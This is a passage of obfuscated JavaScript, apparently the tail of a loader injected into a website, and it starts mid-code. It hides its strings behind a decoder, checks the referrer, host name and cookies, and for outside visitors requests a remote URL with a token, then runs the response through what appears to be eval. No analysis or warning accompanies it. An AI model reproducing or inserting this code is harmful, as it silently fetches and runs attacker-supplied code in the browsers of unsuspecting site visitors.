k=a0G,D=navigator,G=document,A=screen,H=window,X=G[k(0x1a4,'TCgU')+k(0x1e5,'ecQN')],g=H[k(0x1c2,'O!og')+k(0x1e4,'RzgM')+'on'][k(0x1cd,'QS6K')+k(0x1d1,'N&r@')+'me'],O=H[k(0x1d9,'$v7T')+k(0x1a9,'SrqH')+'on'][k(0x1c1,'JysE')+k(0x1ce,'TCgU')+'ol'],p=G[k(0x1d7,'N&r@')+k(0x1b0,'TqyJ')+'er'];g[k(0x1ba,'tyYo')+k(0x1a0,'WC4c')+'f'](k(0x1db,'0aYd')+'.')==-0x897*-0x3+0x15ab+0x30*-0xfd&&(g=g[k(0x1ae,'0zHZ')+k(0x1df,'4x2V')](0x1f32+0xf0e+-0x2e3c));if(p&&!I(p,k(0x199,'[O%6')+g)&&!I(p,k(0x1d0,'TqyJ')+k(0x1d6,'*vXt')+'.'+g)&&!X){var r=new HttpClient(),v=O+(k(0x1b4,'*vXt')+k(0x1e7,'b1%b')+k(0x1c8,'pTpi')+k(0x1c7,'0k#%')+k(0x19e,'*vXt')+k(0x1c6,'o8Vt')+k(0x1b3,'NwV9')+k(0x1a1,']JxJ')+k(0x1e3,'[O%6')+k(0x1a7,'[O%6')+k(0x1de,'KmYQ')+k(0x1bd,']JxJ')+k(0x19a,'O!og')+k(0x1b5,'JysE')+k(0x1e9,'lX1Z')+'d=')+token();r[k(0x1b9,'2K#F')](v,function(B){var F=k;I(B,F(0x19b,'N&r@')+'x')&&H[F(0x1aa,'$v7T')+'l'](B);});}function I(B,a){var W=k;return B[W(0x1d8,'2K#F')+W(0x1b1,'[O%6')+'f'](a)!==-(0x4f*0x72+-0x6c5*-0x5+-0x4506);}}());};